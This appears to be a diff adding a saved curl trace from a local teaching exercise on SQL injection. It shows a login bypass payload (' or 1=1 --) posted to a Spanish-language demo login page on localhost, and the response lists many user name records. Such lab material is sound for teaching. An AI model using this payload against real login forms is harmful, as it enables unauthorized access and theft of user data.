@@ -1,0 +1,53 @@
+$ curl http://localhost/G/xLoginInjection.php -d "pswd=something&login=atleastitried' or 1=1 --" --trace-ascii sneaker-attack.dat
+
+
+== Info:   Trying ::1...
+== Info: TCP_NODELAY set
+== Info: Connected to localhost (::1) port 80 (#0)
+=> Send header, 164 bytes (0xa4)
+0000: POST /G/xLoginInjection.php HTTP/1.1
+0026: Host: localhost
+0037: User-Agent: curl/7.57.0
+0050: Accept: */*
+005d: Content-Length: 45
+0071: Content-Type: application/x-www-form-urlencoded
+00a2: 
+=> Send data, 45 bytes (0x2d)
+0000: pswd=something&login=atleastitried' or 1=1 --
+== Info: upload completely sent off: 45 out of 45 bytes
+<= Recv header, 17 bytes (0x11)
+0000: HTTP/1.1 200 OK
+<= Recv header, 17 bytes (0x11)
+0000: Host: localhost
+<= Recv header, 39 bytes (0x27)
+0000: Date: Mon, 18 Dec 2017 20:46:37 +0000
+<= Recv header, 19 bytes (0x13)
+0000: Connection: close
+<= Recv header, 25 bytes (0x19)
+0000: X-Powered-By: PHP/7.2.0
+<= Recv header, 40 bytes (0x28)
+0000: Content-type: text/html; charset=UTF-8
+<= Recv header, 2 bytes (0x2)
+0000: 
+<= Recv data, 4127 bytes (0x101f)
+0000: .<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+0040: .<HTML>.  <HEAD>.    <META HTTP-EQUIV="CONTENT-TYPE" CONTENT="te
+0080: xt/html; charset=utf-8">.    <TITLE>Ejemplo de SQL injection</TI
+00c0: TLE>.  </HEAD>..  <BODY>.    <h2> Ejemplo de SQL injection: Logi
+0100: n</h2>..    <form name="entrada" method="post" action="xLoginInj
+0140: ection.php">.      <table>.      <tr><td>Nombre:</td><td><input 
+0180: type="text" name="login" value="gatsby"></td></tr>.      <tr><td
+01c0: >Contrase..a:</td><td><input type="password" name="pswd"></td></
+0200: tr>.      </table>.      <input type="submit" value="logon"/>.  
+0240:   </form>..    <h3>Resultado</h3>..  <p>Login correcto</p><ol><l
+0280: i>First Name: pup<br>Last Name: nosh</li><li>First Name: tidily<
+02c0: br>Last Name: hah</li><li>First Name: cancun<br>Last Name: wadi<
+0300: /li><li>First Name: zany<br>Last Name: moray</li><li>First Name:
+0340:  have<br>Last Name: rain</li><li>First Name: jeff<br>Last Name: 
+0380: andre</li><li>First Name: dina<br>Last Name: fill</li><li>First 
+03c0: Name: hoar<br>Last Name: oise</li><li>First Name: brook<br>Last 
+0400: Name: boyd</li><li>First Name: hawley<br>Last Name: bra</li><li>
+0440: First Name: claim<br>Last Name: portal</li><li>First Name: trait
+0480: <br>Last Name: ritual</li><li>First Name: clair<br>Last Name: ro
+04c0: dder</li><li>First Name: skycap<br>Last Name: unbred</li><li>Fir
+0500: st Name: primal<br>Last Name: savior</li><li>First Name: havana<
